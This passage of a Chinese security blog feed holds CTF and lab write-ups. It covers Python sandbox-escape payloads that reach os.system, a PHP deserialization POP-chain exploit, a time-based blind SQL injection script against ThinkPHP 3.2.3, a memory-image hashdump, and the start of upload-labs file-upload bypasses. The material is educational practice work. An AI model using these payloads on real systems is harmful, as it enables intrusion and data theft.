class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__.has_key(<span class="string">'reload'</span>)</span><br><span class="line"><span class="keyword">True</span></span><br></pre></td></tr></table></figure><p>所以在出题的时候我们可以把该模块下的函数删掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br></pre></td></tr></table></figure><h2 id="python-代码执行函数与新特性以及f修饰符"><a href="#python-代码执行函数与新特性以及f修饰符" class="headerlink" title="python 代码执行函数与新特性以及f修饰符"></a>python 代码执行函数与新特性以及f修饰符</h2><p>下面内容摘取自<code>https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</code>以及<code>http://shaobaobaoer.cn/archives/656/python-sandbox-escape</code></p><p>在python中常见的代码执行函数如下所示</p><p>（1）timeit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>（2）exec 和eval 比较经典了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">'__import__("os").system("dir")'</span>)</span><br></pre></td></tr></table></figure><p>（3）platform</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">'dir'</span>).read()</span><br></pre></td></tr></table></figure><p>  (4) getattr() 和 getattribute()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br></pre></td></tr></table></figure><p>​    (5)f修饰符</p><p>用f修饰的字符串将可以执行代码, 但只有python版本在 3.6.0朝上才有这个方法</p><p><img src="https://s2.ax1x.com/2019/02/08/kNEfSK.png" alt="kNEfSK.png"></p><p>这种代码执行方法和PHP中的<code>&lt;?php &quot;${@phpinfo()}&quot;; ?&gt;</code>很类似，这是Python中很少有的几个能够直接将字符串转变成的代码的方式</p><p>执行代码总结</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用file()函数读取文件：（写类似）</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./test.py'</span>).read()</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 __getattibute__ 方法</span></span><br><span class="line"></span><br><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 上述命令需要通过哦 exec 或者别的命令执行函数执行</span></span><br><span class="line"></span><br><span class="line">python3</span><br><span class="line">py2 [<span class="number">58</span>] &lt;<span class="class"><span class="keyword">class</span> '<span class="title">warnings</span>.<span class="title">catch_warnings</span>'&gt; 对应 <span class="title">py3</span> [157]</span></span><br><span class="line"><span class="class"><span class="params">()</span>.<span class="title">__class__</span>.<span class="title">__bases__</span>[0].<span class="title">__subclasses__</span><span class="params">()</span>[157]<span class="params">()</span>.<span class="title">_module</span>.<span class="title">__builtins__</span>['<span class="title">__import__</span>']<span class="params">(<span class="string">"os"</span>)</span>.<span class="title">system</span><span class="params">(<span class="string">"ls"</span>)</span></span></span><br><span class="line"><span class="class">推荐的另外一个类</span></span><br><span class="line"><span class="class">''.<span class="title">__class__</span>.<span class="title">__mro__</span>[1].<span class="title">__subclasses__</span><span class="params">()</span>[104].<span class="title">__init__</span>.<span class="title">__globals__</span>["<span class="title">sys</span>"].<span class="title">modules</span>["<span class="title">os</span>"].<span class="title">system</span><span class="params">(<span class="string">"cat FLAG"</span>)</span></span></span><br></pre></td></tr></table></figure><p>就先总结到这里吧，感觉这个东西联系起SSTI还是可以起很大的作用的。</p><p>参考：</p><p><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a></p><p><a href="https://xz.aliyun.com/t/2308#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-12</a></p><p><a href="https://www.anquanke.com/post/id/85571" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85571</a></p><p><a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基础&quot;&gt;&lt;/a&gt;基础&lt;/h3&gt;&lt;p&gt;一些函数需要了解一下，这篇文章讲的已经很详细
    
    </summary>
    
      <category term="沙盒绕过" scheme="0verwatch.top/categories/%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/"/>
    
    
      <category term="沙盒绕过" scheme="0verwatch.top/tags/%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>安恒一月赛做题记录</title>
    <link href="0verwatch.top/anheng-1mongth.html"/>
    <id>0verwatch.top/anheng-1mongth.html</id>
    <published>2019-02-03T09:05:51.000Z</published>
    <updated>2019-02-08T10:15:25.705Z</updated>
    
    <content type="html"><![CDATA[<p>这个月的安恒月赛好像很有意思<a id="more"></a>，自己忘了去参加了2333，回过头做一做记录一下</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="键盘之争"><a href="#键盘之争" class="headerlink" title="键盘之争"></a>键盘之争</h4><p>百度可以知道历史上有两种键盘，QWERTY键盘还是Dvorak键盘？</p><p>其实就是他们两个的键盘对应的位置不一样导致的映射关系，可以用在线网站解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wbic16.xedoloh.com/dvorak.html</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/05/kYiUgJ.png" alt="kYiUgJ.png"></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="赢战2019"><a href="#赢战2019" class="headerlink" title="赢战2019"></a>赢战2019</h4><p>都是些常规操作，binwalk–&gt;foremost–&gt;stegsolve，说真的现在都不想玩隐写</p><p><img src="https://s2.ax1x.com/2019/02/05/kYihDI.png" alt="kYihDI.png"></p><h4 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h4><p>这个隐写题目就有点意思啦，我以前没碰到过这种内存取证的，可以参考下面的文章<code>https://www.freebuf.com/column/152545.html</code>，这篇文章介绍了很多关于内存取证这款软件的操作，大致的volatility 使用可以概括如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f &lt;文件名&gt; –profile=&lt;配置文件&gt; &lt;插件&gt; [插件参数]</span><br></pre></td></tr></table></figure><p>使用imageinfo插件来猜测dump文件的profile值，<code>volatility -f memory imageinfo</code>，得到profile值为<code>WinXPSP2x86</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kYFHdx.png" alt="kYFHdx.png"></p><p>直接hashdump，毕竟在Windows系统下面，但常规还是得查注册表位置，找到system和sam key的起始位置<code>hivelist -f memory -profile=WinXPSP2x86</code>，这里就不演示了，直接hashdump了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f memory --profile=WinXPSP2x86 hashdump</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/05/kYkZlQ.png" alt="kYkZlQ.png"></p><p>获得密码<code>c22b315c040ae6e0efee3518d830362b</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kYkumn.png" alt="kYkumn.png"></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h4><p>上来就一个源码，但看到<code>unserialize</code>应该就是往反序列化那个方向思考。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里涉及到一个叫pop链的构造问题，下面这篇文章就讲的很详细了<code>https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html</code>，简单来说就是当关键的代码不在魔术方法的时候而是在一些类的普通方法里面的时候，可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。这里需要满足两个条件：</p><ol><li>关键代码不在魔术方法里</li><li>普通的方法里面必须要有相同函数名</li></ol><p>观察关键代码，发现要实现读文件的功能，得先满足下面的条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">      &#123;</span><br><span class="line">          $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">          <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">          &#123;              </span><br><span class="line">              <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>因为两个类都存在read函数这个时候就很可以先构造pop链，因为skyobj是个protected类型的变量，只能使用对象注入了，这样无论是private还是public都可以控制，但是aaa的值会变化，所以需要使用引用使bbb动态跟着aaa。先构造amazing</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing;</span><br><span class="line"></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line">$a-&gt;bbb =&amp;$a-&gt;aaa;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>;</span><br></pre></td></tr></table></figure><p>最终的exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;    </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'./flag.php'</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing=<span class="string">'O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D'</span>; </span><br><span class="line">&#125;   </span><br><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/06/kYRMtg.png" alt="kYRMtg.png"></p><h4 id="Simple-PHP"><a href="#Simple-PHP" class="headerlink" title="Simple PHP"></a>Simple PHP</h4><p>感觉题目玩坏了。。。。</p><p>反正看了看一叶飘零大佬的题解，考的是一个SQL约束攻击，以及一个tp3.2的一个注入，看起来是个报错注入，还是很有意思的一个题目。自己把源码下下来自己复现一下23333，他这个代码里面关键是有一个options变量是可控的，这修复的方案也是不再引用外部的可控变量</p><p>源码下载:<a href="http://www.thinkphp.cn/download/610.html" target="_blank" rel="noopener">http://www.thinkphp.cn/download/610.html</a></p><p>下面是自己搭建该环境(phpstudy)的测试过程</p><p><img src="https://s2.ax1x.com/2019/02/06/kYT2ff.png" alt="kYT2ff.png"></p><p><img src="https://s2.ax1x.com/2019/02/06/kYI7uj.png" alt="kYI7uj.png"></p><p><img src="https://s2.ax1x.com/2019/02/06/kYI58S.png" alt="kYI58S.png"></p><p>再尝试一下飘零大哥的方法,利用了一个时间盲注的方法，tql(破音)~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">45</span>,<span class="number">127</span>):</span><br><span class="line">url = <span class="string">'http://127.0.0.1/thinkphp3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1 and if((ascii(substr((select pass from user limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(j)+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.get(url=url,timeout=<span class="number">2.5</span>)</span><br><span class="line"><span class="keyword">print</span> url</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag += chr(j)</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>同样也能跑出结果</p><p><img src="https://s2.ax1x.com/2019/02/06/kYTbt0.png" alt="kYTbt0.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个月的安恒月赛好像很有意思
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs记录</title>
    <link href="0verwatch.top/upload-labs-wp.html"/>
    <id>0verwatch.top/upload-labs-wp.html</id>
    <published>2019-02-03T08:55:03.000Z</published>
    <updated>2019-02-13T13:53:17.703Z</updated>
    
    <content type="html"><![CDATA[<p>闲来无聊，把upload-labs所有的关卡都刷一遍<a id="more"></a>，就当复习一下文件上传漏洞的各种绕过技巧吧，做完一关再看看源代码提高一下审计能力挺好的</p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>一个前端检测，可以禁用js，也可以直接抓包就可以绕过上传</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ9HYQ.png" alt="kJ9HYQ.png"></p><p>访问成功</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ9zwT.png" alt="kJ9zwT.png"></p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>Content-Type绕过，直接把Content-Type改为图片类型即可</p><p><img src="https://s2.ax1x.com/2019/02/04/kJCA61.png" alt="kJCA61.png"></p><p>上传成功</p><p><img src="https://s2.ax1x.com/2019/02/04/kJCmTO.png" alt="kJCmTO.png"></p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>这一关是另类的文件名的绕过，可以尝试phtml，php3，php4, php5, pht后缀名都可以绕过，但是前提是要在配置文件里面有这样的一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJCIj1.png" alt="kJCIj1.png"></p><p>成功回显</p><p><img src="https://s2.ax1x.com/2019/02/04/kJC7B6.png" alt="kJC7B6.png"></p><p>源码里面直接用的黑名单。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br></pre></td></tr></table></figure><p>当然还有第二种方法</p><p>就是上传<code>.htaccess</code>，实现重写文件解析,同样这样的前提也是得在配置文件里面有这样的一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>上面的方法已经不行了，可以看一下他过滤的名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span 